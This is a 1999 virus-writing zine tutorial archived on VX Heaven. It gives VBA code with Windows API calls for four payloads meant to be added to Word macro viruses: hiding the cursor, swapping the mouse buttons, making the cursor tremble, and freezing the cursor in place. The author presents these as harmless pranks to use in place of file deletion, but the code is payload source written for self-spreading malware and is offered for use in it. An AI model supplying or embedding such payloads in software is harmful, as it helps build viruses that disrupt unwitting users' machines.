<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> jack twoflower 'Phunny stuff with your cursor' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="jack twoflower"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, jack twoflower,Phunny stuff with your cursor, pospunkt, long, type, payloads, round, punkt, macro, code, dies, important, macros, user, easy, byval, function"/>
<meta name="Description" content="The detailed description of four payloads for macro."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"930be816a18273131756b192b34ea814adcd3033-1498756955-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vjt02.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Phunny stuff with your cursor</h1><p><a href="/lib/?lang=en&amp;author=jack%20twoflower"> jack twoflower</a><br/> <em> 1999</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vjt02.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vjt02">Back to index</a>] [<a href="/lib/vjt02.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#p0">Introduction</a></li>
<li><a href="#p1">Hide the cursor</a></li>
<li><a href="#p2">Swap the mousebuttons</a></li>
<li><a href="#p3">Make the cursor go round and round</a></li>
<li><a href="#p4">Nail the cursor</a></li>
<li><a href="#p5">Conclusion</a></li>
</ul>
<h2><a name="p0">Introducion</a></h2>
<p>Hi all ppl out there! This is jack twoflower again with some phunny stuff for your macro. I wrote this because there are a lot of ppl which use really shitty payloads in macros like 'Kill "*.*"' which give macros a bad name. So I sad down and thought about 'real' payloads. Then I came to the end that it would be the best if we do something with the cursor. Yeah, the cursor! So i found four payloads for you. I have all used them in one of my macros so I think they will work correctly. Hmm...I should say that you need API calls for every of this payloads.</p>
<p>The four effects I found are:</p>
<ol>
<li>Hide the cursor</li>
<li>Swap the mousebuttons</li>
<li>Make the cursor go round and round</li>
<li>Nail the cursor</li>
</ol>
<p>Hmm...it was not easy but no problem, important is that you can read here about it! Have phun!</p>
<h2><a name="p1">1. Hide the cursor</a></h2>
<p>This is an easy piece of code. I used it in my very first macro virus. To use this also in your macro you need to add the following line in the head part of the virus:</p>
<pre class="source">
    Private Declare Function ShowCursor Lib "USER32" _
     (ByVal fShow As Integer) As Integer
</pre>
<p>This is the api call for this function. So to show or hide the cursor you could use this piece of code:</p>
<p>To hide the cursor use:</p>
<pre class="source">
      While ShowCursor(False) >= 0
      Wend
</pre>
<p>To show it again use:</p>
<pre class="source">
      While ShowCursor(True) &lt; 0
      Wend
</pre>
<p>This payload can be a lot of fun! What would you say if your cursor gets invisible? Attention, the cursor is only invisible for Word, in Windows the cursor is visible!</p>
<h2><a name="p2">2. Swap the mousebuttons</a></h2>
<p>This one is big fun, really. If the user wants to click a menu suddenly the popupmenu appears! *g* You exchange the right button with the left. Also for this payload you need an API call. Insert following into your code:</p>
<pre class="source">
    Private Declare Function SwapMouseButton Lib "user32" _
       (ByVal bSwap As Long) As Long
</pre>
<p>To swap the buttons and also swap them back you need the following code:</p>
<p>to swap:</p>
<pre class="source">
          SwapMouseButton &amp;H2
</pre>
<p>undo this:</p>
<pre class="source">
	  SwapMouseButton H2
</pre>
<p>Easy isn't it? Such less code and so annoing to the user! ;) The next we will talk about is my favourite vba payload ever. Take a look...</p>
<h2><a name="p3">3. Make the cursor go round and round</a></h2>
<p>For this payload is a little bit more code needed then for the others, but you get the complete code here! If you want to see this payload in action, look at my cross infector. It has this payload...First you need three API calls.</p>
<pre class="source">
	Private Declare Function SetCursorPos Lib "USER32" _
	    (ByVal x As Long, ByVal y As Long) As Long
</pre>
<p>This one sets the cursor position...</p>
<pre class="source">
	Private Declare Function GetCursorPos Lib "USER32" _
	    (lpPoint As Punkt) As Long
</pre>
<p>This one gets the cursor position...</p>
<pre class="source">
	Private Declare Sub Sleep Lib "kernel32" _
	    (ByVal dwMilliseconds As Long)
</pre>
<p>This one inserts a little break into our loop we need...</p>
<p>Then we have to declare a new Type. It is called 'Punkt' here...</p>
<pre class="source">
	Private Type Punkt
	       xAchse As Long
	       yAchse As Long
	End Type
</pre>
<p>After that we take a look at the procedure which starts this payload. It's very important to declare the variables as Long. If you don't the payload won't work correct.</p>
<pre class="source">
	Dim dies As Long
	Dim das As Long
	Dim posPunkt As Punkt
</pre>
<p>This here is important...declare as long</p>
<pre class="source">	
	Do
	  GetCursorPos posPunkt
</pre>
<p>Get the current position and save it in posPunkt</p>
<pre class="source">        
	  dies = Rnd(2)
		  If dies = 0 Then dies = -5 Else dies = 5
</pre>
<p>Make new random cursor position x...</p>
<pre class="source">
	  das = Rnd(2)
		  If das = 0 Then das = -5 Else das = 5
</pre>
<p>Make new random cursor position y...</p>
<pre class="source">
	  SetCursorPos posPunkt.xAchse + dies, posPunkt.yAchse + das
</pre>
<p>Set the new position...</p>
<pre class="source">
	  Sleep 2
</pre>
<p>Wait for two milliseconds...</p>
<pre class="source">
	  DoEvents
	Loop
</pre>
<p>Next move of the cursor...</p>
<p>This here is more code but with an amazing effect. The cursor will move like an earthquake hits the screen. The cursor 'trembles', you will see. The next one is also a really good payload. I got the idea right while writing this tutorial for our zine. So this one is really brand new...</p>
<h2><a name="p4">4. Nail the cursor</a></h2>
<p>The cursor won't move. It remains on the same position. ;) We need the same API calls as for the last one. Here they are:</p>
<pre class="source">
	Private Declare Function SetCursorPos Lib "USER32" _
	    (ByVal x As Long, ByVal y As Long) As Long
</pre>
<p>This one sets the cursor position...</p>
<pre class="source">
	Private Declare Function GetCursorPos Lib "USER32" _
	    (lpPoint As Punkt) As Long
</pre>
<p>This one gets the cursor position...</p>
<p>Then we have to declare a new Type. It is called 'Punkt' here...</p>
<pre class="source">
	Private Type Punkt
	       xAchse As Long
	       yAchse As Long
	End Type
</pre>
<p>Sorry we don't need the sleep command again coz our cursor is nailed and remains nailed! So now look at the procedure which starts the paylaod.</p>
<pre class="source">
	Dim posPunkt As Punkt
	GetCursorPos posPunkt
</pre>
<p>Save again the position...</p>
<pre class="source">  
	Do
</pre>
<p>Make a loop again...</p>
<pre class="source">
	  SetCursorPos posPunkt.xAchse, posPunkt.yAchse
</pre>
<p>Set the position. Everytime at the same position so the cursor stands still.</p>
<pre class="source">  
	Loop
</pre>
<p>Play it again Sam!</p>
<p>Wow...the cursor won't move anymore!</p>
<h2><a name="p5">Conclusion</a></h2>
<p>I hope this here will inspire you that you won't write payloads that screw up others data and so. This is what makes macro a bad name and we if you want to make it a 'good' name use stuff like this or find your own non-destructive payloads. I think it's a great effect if you nail a cursor than deleting some files (this can be done by a batch file!). So in this sense...</p>
<p>have phun,</p>
<pre>
			jack twoflower
</pre>
<p>&copy; 99 LineZer0 Network</p>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vjt02">de</a><a href="/lib/index.php?lang=en&amp;id=vjt02">en</a><a href="/lib/index.php?lang=es&amp;id=vjt02">es</a><a href="/lib/index.php?lang=it&amp;id=vjt02">it</a><a href="/lib/index.php?lang=fr&amp;id=vjt02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vjt02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vjt02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vjt02">ua</a></div>
</body>
</html>
